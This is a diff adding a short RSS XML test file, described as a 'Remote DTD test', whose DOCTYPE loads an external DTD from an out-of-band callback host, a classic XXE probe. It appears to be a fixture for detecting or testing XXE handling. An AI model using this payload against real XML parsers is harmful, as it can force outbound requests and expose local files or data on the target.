@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo SYSTEM "http://d77d4ev4nh6nm03nk7qgm4iy8u8jk41b3.oast.site/xxe.dtd">
+<rss version="2.0">
+  <channel>
+    <title>test</title>
+    <link>http://example.com</link>
+    <description>Remote DTD test</description>
+  </channel>
+</rss>
